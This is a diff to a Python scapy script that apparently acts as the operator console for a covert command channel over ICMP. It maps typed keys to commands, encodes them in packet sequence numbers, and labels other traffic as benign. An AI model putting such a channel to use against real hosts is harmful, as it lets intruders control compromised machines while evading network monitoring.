@@ -1,7 +1,9 @@
 from scapy.all import *
 from multiprocessing import Process
+from commands import *
 
 SESSION_ID = int(1028)
+BENIGN_SEQ = int(99)
 
 def icmp_send(addr, payload, sequence):
     send(IP(dst=addr)/ICMP(type=0, id=SESSION_ID, seq=sequence)/payload)
@@ -18,9 +20,13 @@ def snifff():
 if __name__ == "__main__":
     sniffer = Process(target=snifff)
     sniffer.start()
-    sequence = 1
+
     while 1:
         response = input("\n> ")
-        icmp_send('127.0.0.1', response, sequence)
-        sequence += 1
-        sequence = sequence % 128
+
+        if response in cmdtable:
+            command = cmdtable[response]
+            print("Sending command", response, "to target")
+            icmp_send('127.0.0.1', command[1], command[0])
+        else:
+            icmp_send('127.0.0.1', response, BENIGN_SEQ)
